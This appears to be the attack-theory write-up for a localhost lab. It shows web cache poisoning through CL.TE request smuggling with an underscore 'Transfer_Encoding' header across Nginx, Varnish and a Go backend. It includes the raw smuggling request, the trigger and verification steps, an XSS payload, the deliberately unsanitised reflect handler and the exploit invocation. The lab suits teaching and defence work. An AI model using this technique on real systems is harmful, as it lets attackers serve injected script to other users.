# Attack Theory

## Attack Type

This project demonstrates **web cache poisoning through CL.TE HTTP Request Smuggling** — a class of attack where conflicting HTTP framing headers cause different components of a proxy chain to disagree about where one request ends and the next begins.

---

## The Core Desynchronization

The crafted request carries two framing headers simultaneously:

```http
Content-Length: 153
Transfer_Encoding: chunked
```

- **Nginx** (frontend): forwards both headers because `underscores_in_headers on` prevents the underscore-named header from being dropped.
- **Varnish** (cache): passes the request to the origin without normalising the framing discrepancy.
- **Go backend** (origin): detects `Transfer_Encoding: chunked`, reads until the `0\r\n\r\n` terminator, and **stops** — completely ignoring `Content-Length`. The bytes after the terminator stay unread in the TCP socket buffer.

That unread remainder is the **smuggled prefix**.

---

## Attack Phases

### Phase 0 — HTTP/2 Probe (informational)

The script checks whether Nginx also accepts an HTTP/2 connection preface. If it does, an additional **H2.CL desync** surface exists (where the HTTP/2 DATA frame length disagrees with a forwarded `Content-Length`). This phase does not affect the main CL.TE exploit; it is observational.

### Phase 1 — Plant the Smuggled Prefix

The attacker sends a `POST /reflect` request structured as:

```
POST /reflect HTTP/1.1
Host: localhost
Content-Length: <total body length including smuggled prefix>
Transfer_Encoding: chunked          ← underscore variant passes through Nginx
Connection: keep-alive

6\r\n
CLTE=1\r\n
0\r\n                               ← Go backend stops reading HERE
\r\n
GET /reflect?q=<url-encoded-payload> HTTP/1.1\r\n   ← smuggled prefix
Host: localhost\r\n
Content-Length: 500\r\n
X-Ignore: \r\n                      ← absorbs the next request's first line
```

The `X-Ignore:` partial header is intentional — it absorbs the first line of whatever Varnish sends next, preventing a parse error at the Go backend.

### Phase 2 — Trigger the Cache Miss

On the **same TCP connection**, the attacker immediately sends:

```
GET /js/app.js?cb=demo1 HTTP/1.1
Host: localhost
Connection: keep-alive
```

Varnish sees a cache **MISS** for `/js/app.js?cb=demo1` and forwards it to the backend.

The Go backend's connection loop reads the next "request" — but the socket buffer starts with the smuggled prefix, not the trigger request. It processes:

```
GET /reflect?q=<payload> HTTP/1.1
```

…and returns the attacker's HTML body.

### Phase 3 — Verify Cache Poisoning

From a **new connection**, the attacker requests the same path:

```bash
curl -i "http://localhost/js/app.js?cb=demo1"
```

Expected response:

```
X-Cache: HIT
Content-Type: text/html
Via: 1.1 varnish-v4

<html><body><script>alert('Cache Poisoned!')</script></body></html>
```

Varnish returns the poisoned response directly from cache. The Go backend is never consulted again until the cache entry expires (1 hour for `.js` files).

---

## Why `Transfer_Encoding` (Underscore) Instead of `Transfer-Encoding`

The exploit uses a header name with an **underscore** (`Transfer_Encoding`) rather than the standard hyphen (`Transfer-Encoding`). This is deliberate:

- Nginx's `underscores_in_headers on` directive enables underscore headers to pass through instead of being silently dropped.
- Standard `Transfer-Encoding: chunked` sent to Nginx would be processed by Nginx's own chunked-body parser, preventing the smuggle.
- Varnish forwards the underscore variant to the backend unchanged.
- The Go backend explicitly checks for both forms, so it correctly detects `Transfer_Encoding: chunked` and triggers the vulnerable chunked-read path.

---

## Why `/reflect` Is the Weapon

The `/reflect?q=<value>` endpoint URL-decodes its `q` parameter and echoes it as raw HTML:

```go
if decoded, err := url.QueryUnescape(q); err == nil {
    q = decoded
}
sendResponse(conn, "text/html", fmt.Sprintf("<html><body>%s</body></html>\n", q))
```

No sanitisation is applied. The decoded payload (`<script>alert('Cache Poisoned!')</script>`) is injected verbatim into the response body, which Varnish then caches under the JavaScript file's cache key.

---

## Why Connection Reuse Matters

The smuggled prefix only survives if the **same backend TCP connection** is reused for the trigger request. If the connection closes between Phase 1 and Phase 2, the socket buffer is discarded and the attack fails.

This lab preserves connection reuse through:

- Nginx: `proxy_set_header Connection "keep-alive"`
- Varnish: default backend connection pooling
- Go backend: `Connection: keep-alive` response header

---

## Why Fresh Cache Keys Matter

If Varnish already has `/js/app.js?cb=demo1` cached, the trigger request is answered from cache — it never reaches the Go backend, so the smuggled prefix is never paired with the trigger. The attack silently fails.

Always use a unique `?cb=` value per test run:

```bash
python exploit/attack.py --target-path "/js/app.js?cb=$(date +%s)"
```
